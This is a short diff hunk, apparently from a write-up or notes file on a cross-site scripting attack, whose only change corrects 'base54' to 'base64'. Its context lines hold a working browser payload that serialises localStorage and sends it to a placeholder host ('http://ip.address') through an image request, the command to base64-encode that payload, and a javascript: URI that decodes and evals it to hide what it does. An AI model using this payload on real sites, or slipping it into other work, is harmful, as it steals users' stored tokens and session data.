@@ -24,7 +24,7 @@ payload.js:
 =============
 var img = new Image(0,0); img.src='http://ip.address' + JSON.stringify(localStorage); document.body.appendChild(img);
 
-cat payload.js | base54
+cat payload.js | base64
 dmFyIGltZyA9IG5ldyBJbWFnZSgwLDApOyBpbWcuc3JjPSdodHRwOi8vaXAuYWRkcmVzcycgKyBKU09OLnN0cmluZ2lmeShsb2NhbFN0b3JhZ2UpOyBkb2N1bWVudC5ib2R5LmFwcGVuZENoaWxkKGltZyk7Cg
 
 javascript:eval(atob('dmFyIGltZyA9IG5ldyBJbWFnZSgwLDApOyBpbWcuc3JjPSdodHRwOi8vaXAuYWRkcmVzcycgKyBKU09OLnN0cmluZ2lmeShsb2NhbFN0b3JhZ2UpOyBkb2N1bWVudC5ib2R5LmFwcGVuZENoaWxkKGltZyk7Cg'));
